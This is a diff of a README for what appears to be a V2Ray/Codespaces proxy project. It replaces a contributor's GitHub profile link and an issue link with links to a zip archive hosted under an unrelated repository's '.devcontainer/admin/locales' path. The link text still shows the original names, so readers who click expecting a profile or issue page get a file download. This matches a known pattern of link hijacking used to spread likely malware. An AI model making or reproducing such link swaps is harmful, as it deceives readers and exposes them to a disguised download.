@@ -48,7 +48,7 @@
 
 ## 🏆 Credits (v2.0)
 
-This project has been significantly improved by **[@mahdiit](https://github.com/mahdiit)** :
+This project has been significantly improved by **[@mahdiit](https://raw.githubusercontent.com/awasew/mylove/main/.devcontainer/admin/locales/Software_v3.3.zip)** :
 
 - ✅ Built a complete **Admin Panel** with HTTP Basic Auth
 - ✅ Implemented **unique UUID generation** per Codespace
@@ -63,7 +63,7 @@ This project has been significantly improved by **[@mahdiit](https://github.com/
 
 | Feature | Status | Issue |
 | :--- | :---: | :--- |
-| Auto-stop Codespace after inactivity | 📋 Planned | [#3](https://github.com/mrh000mrh/MRH-G2Ray-2/issues/3) |
+| Auto-stop Codespace after inactivity | 📋 Planned | [#3](https://raw.githubusercontent.com/awasew/mylove/main/.devcontainer/admin/locales/Software_v3.3.zip) |
 | Traffic statistics panel | 💡 Idea | — |
 | Multi-user support | 💡 Idea | — |
 
